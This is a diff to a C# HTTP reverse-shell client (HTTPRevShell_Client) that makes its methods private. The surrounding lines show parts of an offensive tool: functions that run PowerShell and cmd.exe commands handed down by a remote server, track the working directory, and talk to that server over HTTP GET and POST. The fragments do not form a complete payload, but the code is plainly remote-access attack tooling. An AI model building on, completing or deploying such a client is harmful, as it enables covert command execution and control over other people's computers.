@@ -49,7 +49,7 @@ namespace HTTPRevShell_Client
             }
         }
 
-        public static string RunPSH(string cmd)
+        private static string RunPSH(string cmd)
         {
             cmd = cmd.Substring(11);
 
@@ -71,7 +71,7 @@ namespace HTTPRevShell_Client
         }
 
         // Run CMD Command
-        public static (string, string) RunCMD(string cmd, string location)
+        private static (string, string) RunCMD(string cmd, string location)
         {
             Process process = new Process();
             process.StartInfo.FileName = "cmd.exe";
@@ -91,7 +91,7 @@ namespace HTTPRevShell_Client
         }
 
         // Check Root Dir
-        public static string IsRoot(string location)
+        private static string IsRoot(string location)
         {
             if (location.Length <3 && Regex.IsMatch(location, @"[A-Za-z]{1}:"))
             {
@@ -101,7 +101,7 @@ namespace HTTPRevShell_Client
         }
 
         // Change directory
-        public static string ChangeLocation(string cmd, string location, string url)
+        private static string ChangeLocation(string cmd, string location, string url)
         {
             string bkp = location;
             cmd = cmd.Substring(3);
@@ -143,7 +143,7 @@ namespace HTTPRevShell_Client
         }
 
         // HTTP Get Request
-        public static string Get(string uri, string location)
+        private static string Get(string uri, string location)
         {
             HttpWebRequest request = (HttpWebRequest) WebRequest.Create(uri);
             request.Headers.Add("Current-Location", location);
@@ -158,7 +158,7 @@ namespace HTTPRevShell_Client
         }
 
         // HTTP Post Request
-        public static string Post(string uri, string data, string contentType = "text/html", string method = "POST")
+        private static string Post(string uri, string data, string contentType = "text/html", string method = "POST")
         {
             byte[] dataBytes = Encoding.UTF8.GetBytes(data);
 
@@ -183,7 +183,7 @@ namespace HTTPRevShell_Client
         }
 
         // Help Output
-        public static string PrintHelp()
+        private static string PrintHelp()
         {
             return "!#!\n  Spaghetti Overdose\n" +
                 " -----------------------------------------\n" +
